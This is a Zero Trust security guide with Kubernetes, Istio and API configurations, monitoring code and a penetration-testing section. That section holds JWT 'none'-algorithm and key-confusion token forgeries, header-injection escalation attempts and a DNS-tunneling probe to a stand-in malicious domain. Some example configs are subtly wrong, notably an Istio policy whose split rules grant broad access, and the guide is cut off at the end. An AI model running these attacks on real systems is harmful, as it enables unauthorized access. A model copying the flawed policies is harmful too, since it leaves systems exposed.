# **Zero Trust Security Framework: Modern Implementation & Testing Guide**
## (Early 2025) v3.0

Zero Trust is a security model that assumes **no user, device, or service should be trusted by default**—regardless of whether they're inside or outside the network, authenticated or not. Even after successful authentication, every access request is continuously evaluated based on context, behavior, risk factors, and real-time security posture.

---

## **Core Zero Trust Principles (2025 Perspective)**

### **1. Never Trust, Always Verify**
Every entity (user, service, device, API call) must prove its legitimacy for each access request. Authentication is not a one-time event but a continuous process.

### **2. Continuous Authentication & Authorization** 
Sessions are dynamically evaluated using:
- **Behavioral analytics** (unusual access patterns, geolocation changes)
- **Device health** (patch levels, compliance status, endpoint detection)
- **Contextual factors** (time of day, network location, resource sensitivity)
- **Risk scoring** (aggregated threat intelligence, user behavior baselines)

### **3. Microsegmentation**
Network and application resources are divided into minimal trust zones. Access to one zone doesn't grant access to others without explicit re-verification.

### **4. Least Privilege**
Every entity receives only the minimum permissions required for their specific function, with time-bound access tokens and regular privilege reviews.

### **5. Comprehensive Visibility & Analytics**
All activities are logged, monitored, and analyzed in real-time with automated threat response and incident containment.

---

## **🔐 Zero Trust in Cloud-Native Environments**

### **Kubernetes/Container Orchestration**

#### **Pod-Level Security**
```yaml
# Zero Trust Pod Security Standards
apiVersion: v1
kind: Pod
metadata:
  name: zero-trust-app
  annotations:
    # Istio service mesh injection
    sidecar.istio.io/inject: "true"
spec:
  # Run as non-root user
  securityContext:
    runAsNonRoot: true
    runAsUser: 1000
    runAsGroup: 3000
    fsGroup: 2000
    seccompProfile:
      type: RuntimeDefault
  
  serviceAccountName: app-service-account
  
  containers:
  - name: app
    image: myapp:v1.2.3
    securityContext:
      allowPrivilegeEscalation: false
      readOnlyRootFilesystem: true
      capabilities:
        drop:
        - ALL
        add:
        - NET_BIND_SERVICE
    
    # Resource limits for DoS protection
    resources:
      limits:
        memory: "256Mi"
        cpu: "200m"
      requests:
        memory: "128Mi"
        cpu: "100m"
    
    # Liveness and readiness probes
    livenessProbe:
      httpGet:
        path: /health
        port: 8080
      initialDelaySeconds: 30
      periodSeconds: 10
    
    readinessProbe:
      httpGet:
        path: /ready
        port: 8080
      initialDelaySeconds: 5
      periodSeconds: 5
```

#### **Service Mesh Implementation (Istio)**
```yaml
# mTLS Policy - Enforce strict mutual TLS
apiVersion: security.istio.io/v1beta1
kind: PeerAuthentication
metadata:
  name: default
  namespace: production
spec:
  mtls:
    mode: STRICT

---
# Authorization Policy - Zero Trust access control
apiVersion: security.istio.io/v1beta1
kind: AuthorizationPolicy
metadata:
  name: api-access
  namespace: production
spec:
  selector:
    matchLabels:
      app: api-service
  rules:
  - from:
    - source:
        principals: ["cluster.local/ns/production/sa/gateway-service"]
  - to:
    - operation:
        methods: ["GET", "POST"]
        paths: ["/api/v1/*"]
  - when:
    - key: source.ip
      values: ["10.0.0.0/8"]
    - key: request.headers[x-user-role]
      values: ["admin", "user"]

---
# Destination Rule - Circuit breaker and outlier detection
apiVersion: networking.istio.io/v1beta1
kind: DestinationRule
metadata:
  name: api-service
spec:
  host: api-service
  trafficPolicy:
    circuitBreaker:
      consecutiveErrors: 3
      interval: 30s
      baseEjectionTime: 30s
      maxEjectionPercent: 50
    outlierDetection:
      consecutive5xxErrors: 3
      interval: 30s
      baseEjectionTime: 30s
```

#### **Network Policies - Microsegmentation**
```yaml
# Deny-all default policy
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: deny-all
  namespace: production
spec:
  podSelector: {}
  policyTypes:
  - Ingress
  - Egress

---
# Specific service communication policy
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: api-service-policy
spec:
  podSelector:
    matchLabels:
      app: api-service
  policyTypes:
  - Ingress
  - Egress
  ingress:
  - from:
    - podSelector:
        matchLabels:
          app: gateway
    ports:
    - protocol: TCP
      port: 8080
  egress:
  - to:
    - podSelector:
        matchLabels:
          app: database
    ports:
    - protocol: TCP
      port: 5432
  - to: []  # DNS
    ports:
    - protocol: UDP
      port: 53
```

---

## **🌐 API Security in Zero Trust**

### **API Gateway Zero Trust Implementation**

#### **OAuth 2.0/OpenID Connect with Continuous Validation**
```yaml
# Kong API Gateway with Zero Trust policies
apiVersion: configuration.konghq.com/v1
kind: KongPlugin
metadata:
  name: oauth2-zero-trust
plugin: oauth2
config:
  scopes:
  - read
  - write
  - admin
  token_expiration: 300  # Short-lived tokens (5 minutes)
  enable_implicit_grant: false
  enable_client_credentials: true
  provision_key: "provision123"

---
# Rate limiting with dynamic thresholds
apiVersion: configuration.konghq.com/v1
kind: KongPlugin
metadata:
  name: dynamic-rate-limiting
plugin: rate-limiting-advanced
config:
  limit:
  - 100
  - 1000
  window_size:
  - 60
  - 3600
  identifier: consumer
  sync_rate: 5
  strategy: redis
  redis_host: redis.gateway.svc.cluster.local
```

#### **GraphQL Zero Trust Security**
```javascript
// GraphQL with Zero Trust validation
const { ApolloServer } = require('apollo-server-express');
const { shield, rule, and, or } = require('graphql-shield');

// Zero Trust rules
const isAuthenticated = rule({ cache: 'contextual' })(
  async (parent, args, context) => {
    // Continuous authentication check
    const isValid = await validateToken(context.token);
    const riskScore = await calculateRiskScore(context);
    
    return isValid && riskScore < 0.7;
  }
);

const hasPermission = (permission) => rule({ cache: 'contextual' })(
  async (parent, args, context) => {
    // Real-time permission check
    return await checkPermission(context.user, permission, context.resource);
  }
);

const isFromTrustedNetwork = rule({ cache: 'contextual' })(
  async (parent, args, context) => {
    const clientIP = context.clientIP;
    return await isIPTrusted(clientIP);
  }
);

// Zero Trust shield
const permissions = shield({
  Query: {
    users: and(isAuthenticated, hasPermission('read:users'), isFromTrustedNetwork),
    sensitiveData: and(
      isAuthenticated,
      hasPermission('read:sensitive'),
      isFromTrustedNetwork,
      rule()(async (parent, args, context) => {
        // Additional MFA requirement for sensitive data
        return await verifyMFA(context.user);
      })
    )
  },
  Mutation: {
    deleteUser: and(
      isAuthenticated,
      hasPermission('delete:users'),
      isFromTrustedNetwork,
      rule()(async (parent, args, context) => {
        // Require elevated privileges for destructive operations
        return await verifyElevatedPrivileges(context.user);
      })
    )
  }
});

const server = new ApolloServer({
  typeDefs,
  resolvers,
  middlewares: [permissions],
  context: ({ req }) => ({
    token: req.headers.authorization,
    user: req.user,
    clientIP: req.ip,
    userAgent: req.headers['user-agent'],
    timestamp: Date.now()
  })
});
```

### **REST API Zero Trust Patterns**
```python
# Flask API with Zero Trust middleware
from flask import Flask, request, jsonify, g
from functools import wraps
import jwt
import time
import hashlib

app = Flask(__name__)

class ZeroTrustValidator:
    def __init__(self):
        self.redis_client = redis.Redis()
        self.risk_calculator = RiskCalculator()
    
    def continuous_auth(self, f):
        @wraps(f)
        def decorated(*args, **kwargs):
            # 1. Token validation
            token = request.headers.get('Authorization', '').replace('Bearer ', '')
            try:
                payload = jwt.decode(token, app.config['JWT_SECRET'], algorithms=['HS256'])
            except jwt.InvalidTokenError:
                return jsonify({'error': 'Invalid token'}), 401
            
            # 2. Session validation
            session_key = f"session:{payload['sub']}"
            session_data = self.redis_client.get(session_key)
            if not session_data:
                return jsonify({'error': 'Session expired'}), 401
            
            # 3. Risk assessment
            risk_score = self.calculate_risk_score(request, payload)
            if risk_score > 0.7:
                # Require step-up authentication
                return jsonify({
                    'error': 'Additional authentication required',
                    'step_up_required': True
                }), 403
            
            # 4. Resource-specific authorization
            resource = request.endpoint
            if not self.has_permission(payload['sub'], resource, request.method):
                return jsonify({'error': 'Insufficient permissions'}), 403
            
            # 5. Rate limiting based on risk
            rate_limit = self.get_dynamic_rate_limit(payload['sub'], risk_score)
            if not self.check_rate_limit(payload['sub'], rate_limit):
                return jsonify({'error': 'Rate limit exceeded'}), 429
            
            g.user = payload
            g.risk_score = risk_score
            return f(*args, **kwargs)
        
        return decorated
    
    def calculate_risk_score(self, request, payload):
        factors = {
            'ip_reputation': self.check_ip_reputation(request.remote_addr),
            'geolocation_anomaly': self.check_geolocation_anomaly(payload['sub'], request.remote_addr),
            'device_fingerprint': self.check_device_fingerprint(request.headers.get('User-Agent')),
            'behavioral_anomaly': self.check_behavioral_anomaly(payload['sub'], request),
            'time_anomaly': self.check_time_anomaly(payload['sub']),
        }
        
        # Weighted risk calculation
        weights = {
            'ip_reputation': 0.3,
            'geolocation_anomaly': 0.2,
            'device_fingerprint': 0.2,
            'behavioral_anomaly': 0.2,
            'time_anomaly': 0.1
        }
        
        risk_score = sum(factors[k] * weights[k] for k in factors)
        return min(risk_score, 1.0)

# Zero Trust decorator usage
validator = ZeroTrustValidator()

@app.route('/api/users', methods=['GET'])
@validator.continuous_auth
def get_users():
    # Additional context-aware checks
    if g.risk_score > 0.5:
        # Return limited data for higher risk
        return jsonify(get_limited_user_data())
    
    return jsonify(get_full_user_data())

@app.route('/api/admin/users/<user_id>', methods=['DELETE'])
@validator.continuous_auth
def delete_user(user_id):
    # Require additional verification for high-risk operations
    if g.risk_score > 0.3:
        mfa_token = request.headers.get('X-MFA-Token')
        if not verify_mfa_token(g.user['sub'], mfa_token):
            return jsonify({'error': 'MFA verification required'}), 403
    
    # Log high-privilege action
    audit_log.info({
        'action': 'delete_user',
        'user': g.user['sub'],
        'target': user_id,
        'risk_score': g.risk_score,
        'ip': request.remote_addr,
        'timestamp': time.time()
    })
    
    return delete_user_by_id(user_id)
```

---

## **🔧 Zero Trust Testing Methodologies**

### **Identity & Access Management Testing**

#### **JWT Security Testing**
```python
# JWT Zero Trust validation testing
import jwt
import time
import requests

class JWTZeroTrustTester:
    def __init__(self, base_url, secret=None):
        self.base_url = base_url
        self.secret = secret
    
    def test_continuous_authentication(self):
        """Test that tokens are continuously validated"""
        # 1. Get valid token
        token = self.get_valid_token()
        
        # 2. Make initial request
        response = self.make_request('/api/data', token)
        assert response.status_code == 200
        
        # 3. Wait for token to expire
        time.sleep(310)  # Wait 5+ minutes
        
        # 4. Try same request - should fail
        response = self.make_request('/api/data', token)
        assert response.status_code == 401
        
        print("✓ Continuous authentication test passed")
    
    def test_risk_based_access(self):
        """Test that access adapts based on risk"""
        token = self.get_valid_token()
        
        # 1. Normal request from trusted IP
        response = self.make_request('/api/data', token, ip='192.168.1.100')
        assert response.status_code == 200
        
        # 2. Request from suspicious IP
        response = self.make_request('/api/data', token, ip='1.2.3.4')
        # Should either deny or require step-up auth
        assert response.status_code in [403, 401] or 'step_up_required' in response.json()
        
        print("✓ Risk-based access test passed")
    
    def test_privilege_escalation_protection(self):
        """Test that privilege escalation is prevented"""
        # 1. Get user token
        user_token = self.get_token(role='user')
        
        # 2. Try to access admin endpoint
        response = self.make_request('/api/admin/users', user_token)
        assert response.status_code == 403
        
        # 3. Try token manipulation
        try:
            # Decode without verification
            payload = jwt.decode(user_token, options={"verify_signature": False})
            payload['role'] = 'admin'
            
            # Sign with weak key
            malicious_token = jwt.encode(payload, 'weak-key', algorithm='HS256')
            response = self.make_request('/api/admin/users', malicious_token)
            assert response.status_code in [401, 403]
            
        except Exception as e:
            print(f"Token manipulation failed as expected: {e}")
        
        print("✓ Privilege escalation protection test passed")
    
    def test_behavioral_anomaly_detection(self):
        """Test that behavioral anomalies trigger additional verification"""
        token = self.get_valid_token()
        
        # 1. Establish normal behavior pattern
        for _ in range(5):
            response = self.make_request('/api/profile', token)
            time.sleep(1)
        
        # 2. Create anomalous behavior (rapid requests)
        responses = []
        for _ in range(50):
            response = self.make_request('/api/sensitive-data', token)
            responses.append(response)
        
        # Should trigger rate limiting or step-up auth
        blocked_responses = [r for r in responses if r.status_code in [429, 403]]
        assert len(blocked_responses) > 0
        
        print("✓ Behavioral anomaly detection test passed")
```

### **Service Mesh Security Testing**

#### **mTLS Validation Testing**
```bash
#!/bin/bash
# mTLS Zero Trust testing script

echo "🔐 Testing mTLS Zero Trust Implementation"

# Test 1: Verify mTLS is enforced
echo "Test 1: mTLS Enforcement"
kubectl exec -it deployment/test-client -- curl -v http://api-service:8080/health 2>&1 | grep -q "SSL connection error"
if [ $? -eq 0 ]; then
    echo "✓ mTLS correctly blocks non-TLS connections"
else
    echo "✗ mTLS enforcement failed"
fi

# Test 2: Certificate validation
echo "Test 2: Certificate Validation"
kubectl exec -it deployment/test-client -- curl -v --cert /tmp/invalid.crt --key /tmp/invalid.key https://api-service:8443/health 2>&1 | grep -q "certificate verify failed"
if [ $? -eq 0 ]; then
    echo "✓ Invalid certificates correctly rejected"
else
    echo "✗ Certificate validation failed"
fi

# Test 3: Service identity verification
echo "Test 3: Service Identity Verification"
CERT_SUBJECT=$(kubectl exec deployment/api-service -- openssl x509 -in /etc/ssl/certs/cert-chain.pem -noout -subject)
if echo "$CERT_SUBJECT" | grep -q "spiffe://cluster.local/ns/production/sa/api-service"; then
    echo "✓ Service identity correctly configured"
else
    echo "✗ Service identity verification failed"
fi

# Test 4: Authorization policy enforcement
echo "Test 4: Authorization Policy"
kubectl exec -it deployment/unauthorized-client -- curl -v --cert /etc/ssl/certs/cert.pem --key /etc/ssl/private/key.pem https://api-service:8443/admin 2>&1 | grep -q "RBAC: access denied"
if [ $? -eq 0 ]; then
    echo "✓ Authorization policies correctly enforced"
else
    echo "✗ Authorization policy enforcement failed"
fi

# Test 5: Network policy validation
echo "Test 5: Network Policy"
kubectl run test-pod --image=curlimages/curl --rm -i --tty -- curl -m 5 http://api-service:8080/health
if [ $? -ne 0 ]; then
    echo "✓ Network policies correctly isolate services"
else
    echo "✗ Network policy enforcement failed"
fi
```

#### **Service Mesh Policy Testing**
```yaml
# Test authorization policies with different scenarios
apiVersion: v1
kind: ConfigMap
metadata:
  name: security-tests
data:
  test-policies.yaml: |
    # Test cases for Zero Trust policies
    tests:
      - name: "Admin access from production namespace"
        source:
          namespace: "production"
          service_account: "admin-service"
        destination:
          service: "api-service"
          path: "/admin/*"
        expected: "ALLOW"
      
      - name: "User access from staging namespace"
        source:
          namespace: "staging" 
          service_account: "user-service"
        destination:
          service: "api-service"
          path: "/admin/*"
        expected: "DENY"
      
      - name: "Cross-namespace access denied"
        source:
          namespace: "development"
          service_account: "test-service"
        destination:
          service: "production-api"
          path: "/*"
        expected: "DENY"

---
# Automated policy testing job
apiVersion: batch/v1
kind: Job
metadata:
  name: zero-trust-policy-test
spec:
  template:
    spec:
      containers:
      - name: policy-tester
        image: istio/pilot:latest
        command: ["sh", "-c"]
        args:
        - |
          # Test authorization policies
          istioctl proxy-config authz deployment/api-service --output json | jq '.policies[] | select(.name | contains("api-access"))'
          
          # Verify mTLS configuration
          istioctl authn tls-check api-service.production.svc.cluster.local
          
          # Test traffic routing
          for i in {1..10}; do
            kubectl exec deployment/test-client -- curl -s api-service/health || echo "Request $i failed"
          done
      restartPolicy: Never
```

---

## **📊 Continuous Monitoring & Analytics**

### **Zero Trust Metrics & KPIs**
```python
# Zero Trust monitoring and metrics collection
import prometheus_client
from prometheus_client import Counter, Histogram, Gauge
import logging
import json
from datetime import datetime, timedelta

class ZeroTrustMonitor:
    def __init__(self):
        # Prometheus metrics
        self.auth_requests = Counter('zt_auth_requests_total', 'Total authentication requests', ['result', 'risk_level'])
        self.auth_latency = Histogram('zt_auth_duration_seconds', 'Authentication duration')
        self.risk_scores = Histogram('zt_risk_scores', 'Risk score distribution', buckets=(0.1, 0.2, 0.3, 0.5, 0.7, 0.9, 1.0))
        self.active_sessions = Gauge('zt_active_sessions', 'Number of active sessions')
        self.policy_violations = Counter('zt_policy_violations_total', 'Policy violations', ['type', 'severity'])
        
        # Setup structured logging
        logging.basicConfig(
            format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
            level=logging.INFO
        )
        self.logger = logging.getLogger('zero-trust')
    
    def log_authentication_event(self, user_id, result, risk_score, context):
        """Log authentication events with full context"""
        risk_level = self.categorize_risk(risk_score)
        
        # Update metrics
        self.auth_requests.labels(result=result, risk_level=risk_level).inc()
        self.risk_scores.observe(risk_score)
        
        # Structured logging
        self.logger.info(json.dumps({
            'event_type': 'authentication',
            'timestamp': datetime.utcnow().isoformat(),
            'user_id': user_id,
            'result': result,
            'risk_score': risk_score,
            'risk_level': risk_level,
            'ip_address': context.get('ip_address'),
            'user_agent': context.get('user_agent'),
            'geolocation': context.get('geolocation'),
            'device_fingerprint': context.get('device_fingerprint'),
            'session_id': context.get('session_id')
        }))
        
        # Alert on high-risk authentication
        if risk_score > 0.8:
            self.send_alert('high_risk_auth', {
                'user_id': user_id,
                'risk_score': risk_score,
                'context': context
            })
    
    def log_authorization_event(self, user_id, resource, action, result, context):
        """Log authorization decisions"""
        self.logger.info(json.dumps({
            'event_type': 'authorization',
            'timestamp': datetime.utcnow().isoformat(),
            'user_id': user_id,
            'resource': resource,
            'action': action,
            'result': result,
            'context': context
        }))
        
        if result == 'DENIED':
            self.policy_violations.labels(type='access_denied', severity='medium').inc()
    
    def detect_anomalies(self):
        """Detect behavioral anomalies"""
        # Analyze recent authentication patterns
        recent_auths = self.get_recent_authentications(timedelta(hours=1))
        
        for user_id, auths in recent_auths.items():
            # Check for unusual patterns
            anomalies = []
            
            # Geographic anomaly
            locations = set([auth['geolocation'] for auth in auths])
            if len(locations) > 2:  # Multiple locations in short time
                anomalies.append('geographic_anomaly')
            
            # Frequency anomaly
            if len(auths) > 50:  # Too many requests
                anomalies.append('frequency_anomaly')
            
            # Device anomaly
            devices = set([auth['device_fingerprint'] for auth in auths])
            if len(devices) > 3:  # Multiple devices
                anomalies.append('device_anomaly')
            
            if anomalies:
                self.send_alert('behavioral_anomaly', {
                    'user_id': user_id,
                    'anomalies': anomalies,
                    'auth_count': len(auths),
                    'time_window': '1hour'
                })
    
    def generate_zero_trust_report(self):
        """Generate Zero Trust security posture report"""
        report = {
            'timestamp': datetime.utcnow().isoformat(),
            'metrics': {
                'total_auth_requests': self.auth_requests._value.sum(),
                'avg_risk_score': self.calculate_avg_risk_score(),
                'active_sessions': self.active_sessions._value.get(),
                'policy_violations': self.policy_violations._value.sum(),
            },
            'security_posture': self.calculate_security_posture(),
            'recommendations': self.generate_recommendations()
        }
        
        return report
    
    @staticmethod
    def categorize_risk(risk_score):
        """Categorize risk score into levels"""
        if risk_score < 0.3:
            return 'low'
        elif risk_score < 0.7:
            return 'medium'
        else:
            return 'high'
```

### **Automated Incident Response**
```python
# Zero Trust automated response system
class ZeroTrustIncidentResponse:
    def __init__(self, k8s_client, istio_client, notification_client):
        self.k8s = k8s_client
        self.istio = istio_client
        self.notifications = notification_client
        self.response_rules = self.load_response_rules()
    
    def handle_security_event(self, event):
        """Process security events and trigger appropriate responses"""
        event_type = event.get('event_type')
        severity = event.get('severity', 'medium')
        
        # Determine response based on event type and severity
        responses = self.determine_responses(event_type, severity)
        
        for response in responses:
            try:
                self.execute_response(response, event)
            except Exception as e:
                self.logger.error(f"Failed to execute response {response}: {e}")
    
    def execute_response(self, response_type, event):
        """Execute specific incident response actions"""
        if response_type == 'isolate_service':
            self.isolate_service(event['service_name'], event['namespace'])
        
        elif response_type == 'revoke_tokens':
            self.revoke_user_tokens(event['user_id'])
        
        elif response_type == 'block_ip':
            self.block_ip_address(event['ip_address'])
        
        elif response_type == 'require_mfa':
            self.enforce_mfa_for_user(event['user_id'])
        
        elif response_type == 'quarantine_pod':
            self.quarantine_pod(event['pod_name'], event['namespace'])
        
        elif response_type == 'escalate_alert':
            self.escalate_to_security_team(event)
    
    def isolate_service(self, service_name, namespace):
        """Isolate a compromised service using network policies"""
        isolation_policy = {
            'apiVersion': 'networking.k8s.io/v1',
            'kind': 'NetworkPolicy',
            'metadata': {
                'name': f'{service_name}-isolation',
                'namespace': namespace
            },
            'spec': {
                'podSelector': {
                    'matchLabels': {
                        'app': service_name
                    }
                },
                'policyTypes': ['Ingress', 'Egress'],
                'ingress': [],  # Block all ingress
                'egress': [
                    {
                        'to': [{'namespaceSelector': {'matchLabels': {'name': 'kube-system'}}}],
                        'ports': [{'protocol': 'UDP', 'port': 53}]  # Allow DNS only
                    }
                ]
            }
        }
        
        self.k8s.create_namespaced_network_policy(
            namespace=namespace,
            body=isolation_policy
        )
        
        self.logger.info(f"Service {service_name} isolated in namespace {namespace}")
    
    def quarantine_pod(self, pod_name, namespace):
        """Quarantine a suspicious pod"""
        # Label the pod for quarantine
        self.k8s.patch_namespaced_pod(
            name=pod_name,
            namespace=namespace,
            body={'metadata': {'labels': {'security.status': 'quarantined'}}}
        )
        
        # Create restrictive network policy for quarantined pods
        quarantine_policy = {
            'apiVersion': 'networking.k8s.io/v1',
            'kind': 'NetworkPolicy',
            'metadata': {
                'name': 'quarantine-policy',
                'namespace': namespace
            },
            'spec': {
                'podSelector': {
                    'matchLabels': {
                        'security.status': 'quarantined'
                    }
                },
                'policyTypes': ['Ingress', 'Egress'],
                'ingress': [],
                'egress': []  # Complete isolation
            }
        }
        
        try:
            self.k8s.create_namespaced_network_policy(
                namespace=namespace,
                body=quarantine_policy
            )
        except Exception as e:
            if "already exists" not in str(e):
                raise e
        
        self.logger.info(f"Pod {pod_name} quarantined in namespace {namespace}")
```

---

## **🧪 Zero Trust Penetration Testing**

### **Service Mesh Security Testing**
```bash
#!/bin/bash
# Comprehensive Zero Trust penetration testing

echo "🧪 Zero Trust Security Assessment"

# Test 1: Service Identity Spoofing
echo "=== Test 1: Service Identity Spoofing ==="
kubectl create sa fake-admin-service -n production
kubectl create secret generic fake-certs --from-file=cert.pem --from-file=key.pem
kubectl run spoof-test --image=curlimages/curl --serviceaccount=fake-admin-service --rm -i --tty -- \
    curl -k --cert /tmp/cert.pem --key /tmp/key.pem https://api-service:8443/admin

# Test 2: mTLS Bypass Attempts
echo "=== Test 2: mTLS Bypass Testing ==="
# Try to bypass mTLS with various techniques
kubectl run mtls-bypass-test --image=alpine/curl --rm -i --tty -- sh -c "
    echo 'Testing HTTP downgrade...'
    curl -v http://api-service:8080/health 2>&1 | grep -E '(SSL|TLS|refused)'
    
    echo 'Testing weak ciphers...'
    curl -v --cipher 'DES-CBC3-SHA' https://api-service:8443/health 2>&1 | grep -E '(cipher|SSL|TLS)'
    
    echo 'Testing certificate bypass...'
    curl -k --cert /dev/null --key /dev/null https://api-service:8443/health 2>&1 | grep -E '(certificate|SSL|TLS)'
"

# Test 3: Authorization Policy Bypass
echo "=== Test 3: Authorization Policy Bypass ==="
# Create test service account with minimal permissions
kubectl create sa test-service -n staging
kubectl run authz-test --image=curlimages/curl --serviceaccount=test-service -n staging --rm -i --tty -- sh -c "
    echo 'Testing cross-namespace access...'
    curl -v https://production-api.production.svc.cluster.local:8443/admin
    
    echo 'Testing privilege escalation...'
    curl -v -H 'X-Original-User: admin' https://api-service.production.svc.cluster.local:8443/admin
    
    echo 'Testing header injection...'
    curl -v -H 'X-Forwarded-User: admin' -H 'X-Remote-User: admin' https://api-service:8443/admin
"

# Test 4: Network Policy Evasion
echo "=== Test 4: Network Policy Evasion ==="
# Test various network evasion techniques
kubectl run network-test --image=nicolaka/netshoot --rm -i --tty -- sh -c "
    echo 'Testing DNS tunneling...'
    nslookup admin-command.evil.domain
    
    echo 'Testing protocol tunneling...'
    nc -v api-service 8080 < /dev/null
    nc -v api-service 8443 < /dev/null
    
    echo 'Testing ICMP tunneling...'
    ping -c 1 api-service
"

# Test 5: JWT Token Attacks
echo "=== Test 5: JWT Security Testing ==="
python3 << 'EOF'
import jwt
import requests
import base64
import json

def test_jwt_vulnerabilities():
    # Get a legitimate token first
    auth_response = requests.post('https://auth.example.com/token', {
        'username': 'testuser',
        'password': 'testpass'
    })
    
    if auth_response.status_code != 200:
        print("Failed to get test token")
        return
    
    token = auth_response.json()['access_token']
    
    # Test 1: Algorithm confusion attack
    print("Testing algorithm confusion...")
    header = json.loads(base64.urlsafe_b64decode(token.split('.')[0] + '=='))
    payload = json.loads(base64.urlsafe_b64decode(token.split('.')[1] + '=='))
    
    # Change algorithm to 'none'
    header['alg'] = 'none'
    payload['role'] = 'admin'  # Escalate privileges
    
    none_token = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=') + '.'
    none_token += base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=') + '.'
    
    # Test the none algorithm token
    response = requests.get('https://api.example.com/admin', 
                          headers={'Authorization': f'Bearer {none_token}'})
    
    print(f"None algorithm test: {response.status_code}")
    
    # Test 2: Key confusion attack
    print("Testing key confusion...")
    try:
        # Try to use public key as HMAC secret
        with open('public.pem', 'rb') as f:
            public_key = f.read()
        
        payload['role'] = 'admin'
        malicious_token = jwt.encode(payload, public_key, algorithm='HS256')
        
        response = requests.get('https://api.example.com/admin',
                              headers={'Authorization': f'Bearer {malicious_token}'})
        
        print(f"Key confusion test: {response.status_code}")
    except Exception as e:
        print(f"Key confusion test failed: {e}")

test_jwt_vulnerabilities()
EOF

echo "=== Zero Trust Assessment Complete ==="
```

### **Behavioral Analytics Testing**
```python
# Zero Trust behavioral analytics testing
import requests
import time
import random
import threading
from concurrent.futures import ThreadPoolExecutor

class ZeroTrustBehaviorTester:
    def __init__(self, base_url, token):
        self.base_url = base_url
        self.token = token
        self.session = requests.Session()
        self.session.headers.update({'Authorization': f'Bearer {token}'})
    
    def test_anomaly_detection(self):
        """Test if behavioral anomalies trigger security responses"""
        print("🧪 Testing behavioral anomaly detection...")
        
        # Test 1: Rapid request pattern
        print("Testing rapid request anomaly...")
        start_time = time.time()
        responses = []
        
        for i in range(100):
            try:
                response = self.session.get(f'{self.base_url}/api/data')
                responses.append((response.status_code, time.time() - start_time))
                
                # Check if rate limiting kicks in
                if response.status_code == 429:
                    print(f"✓ Rate limiting triggered after {i+1} requests")
                    break
                    
                time.sleep(0.1)  # Very rapid requests
            except Exception as e:
                print(f"Request failed: {e}")
                break
        
        # Test 2: Geographic anomaly simulation
        print("Testing geographic anomaly...")
        suspicious_ips = ['1.2.3.4', '5.6.7.8', '9.10.11.12']
        
        for ip in suspicious_ips:
            headers = {'X-Forwarded-For': ip, 'X-Real-IP': ip}
            response = self.session.get(f'{self.base_url}/api/sensitive', headers=headers)
            
            if response.status_code in [403, 401]:
                print(f"✓ Geographic anomaly detected for IP {ip}")
            elif 'step_up' in response.text.lower():
                print(f"✓ Step-up authentication required for IP {ip}")
    
    def test_privilege_escalation_attempts(self):
        """Test various privilege escalation attempts"""
        print("🧪 Testing privilege escalation protection...")
        
        escalation_attempts = [
            # Header injection
            {'X-Original-User': 'admin'},
            {'X-Forwarded-User': 'admin'},
            {'X-Remote-User': 'admin'},
            {'X-User-Role': 'admin'},
            
            # Parameter pollution
            {'role': 'admin'},
            {'user_role': 'administrator'},
            {'privilege_level': 'superuser'},
        ]
        
        for attempt in escalation_attempts:
            response = self.session.get(f'{self.base_url}/api/admin', 
                                      headers=attempt if 'X-' in list(attempt.keys())[0] else None,
                                      params=attempt if 'X-' not in list(attempt.keys())[0] else None)
            
            if response.status_code in [403, 401]:
                print(f"✓ Privilege escalation blocked: {attempt}")
            else:
                print(f"⚠️  Potential privilege escalation: {attempt} - Status: {response.status_code}")
    
    def test_session_hijacking_protection(self):
        """Test session hijacking and fixation protection"""
        print("🧪 Testing session security...")
        
        # Test 1: Session token reuse from different IP
        original_response = self.session.get(f'{self.base_url}/api/profile')
        original_ip = '192.168.1.100'
        
        # Try to use same token from different IP
        hijack_headers = {
            'X-Forwarded-For': '10.0.0.1',
            'X-Real-IP': '10.0.0.1',
            'User-Agent': 'Different-Browser/1.0'
        }
        
        hijack_response = self.session.get(f'{self.base_url}/api/profile', headers=hijack_headers)
        
        if hijack_response.status_code in [403, 401]:
            print("✓ Session hijacking protection active")
        elif 'additional_verification' in hijack_response.text.lower():
            print("✓ Step-up authentication triggered for suspicious session")
        
        # Test 2: Concurrent session detection
        print("Testing concurrent session limits...")
        
        def create_concurrent_session():
            new_session = requests.Session()
            new_session.headers.update({'Authorization': f'Bearer {self.token}'})
            return new_session.get(f'{self.base_url}/api/profile')
        
        with ThreadPoolExecutor(max_workers=5) as executor:
            concurrent_responses = list(executor.map(lambda _: create_concurrent_session(), range(5)))
        
        blocked_sessions = sum(1 for r in concurrent_responses if r.status_code in [403, 401])
        
        if blocked_sessions > 0:
            print(f"✓ Concurrent session limits enforced ({blocked_sessions} blocked)")
    
    def test_data_access_controls(self):
        """Test fine-grained data access controls"""
        print("🧪 Testing data access controls...")
        
        # Test accessing different user's data
        user_ids = ['1', '2', '100', '999', 'admin', '../admin']
        
        for user_id in user_ids:
            response = self.session.get(f'{self.base_url}/api/users/{user_id}')
            
            # Should only allow access to own user ID or return filtered data
            if user_id in ['100', '999', 'admin', '../admin']:
                if response.status_code in [403, 401, 404]:
                    print(f"✓ Unauthorized access blocked for user {user_id}")
                else:
                    print(f"⚠️  Potential data access violation for user {user_id}")

# Run the behavioral tests
if __name__ == "__main__":
    # Get test token (implement your auth logic)
    test_token = "your-test-jwt-token"
    tester = ZeroTrustBehaviorTester("https://api.example.com", test_token)
    
    tester.test_anomaly_detection()
    tester.test_privilege_escalation_attempts()
    tester.test_session_hijacking_protection()
    tester.test_data_access_controls()
```

---

## **📈 Zero Trust Maturity Model**

### **Level 1: Basic Zero Trust**
- ✅ Basic identity verification
- ✅ Network segmentation
- ✅ Multi-factor authentication
- ✅ Basic logging and monitoring

### **Level 2: Enhanced Zero Trust**
- ✅ Continuous authentication
- ✅ Risk-based access controls  
- ✅ Service mesh with mTLS
- ✅ Behavioral analytics
- ✅ Automated threat response

### **Level 3: Advanced Zero Trust**
- ✅ AI/ML-powered risk assessment
- ✅ Real-time adaptive policies
- ✅ Microsegmentation at scale
- ✅ Comprehensive data protection
- ✅ Full supply chain security

### **Level 4: Autonomous Zero Trust**
- ✅ Self-healing security policies
- ✅ Predictive threat prevention
- ✅ Automated compliance validation
- ✅ Context-aware data classification
- ✅ Quantum-resistant cryptography

---

## **🔧 Modern Zero Trust Tools & Technologies (2025)**

| **Category** | **Tool/Technology** | **Purpose** | **Zero Trust Capability** |
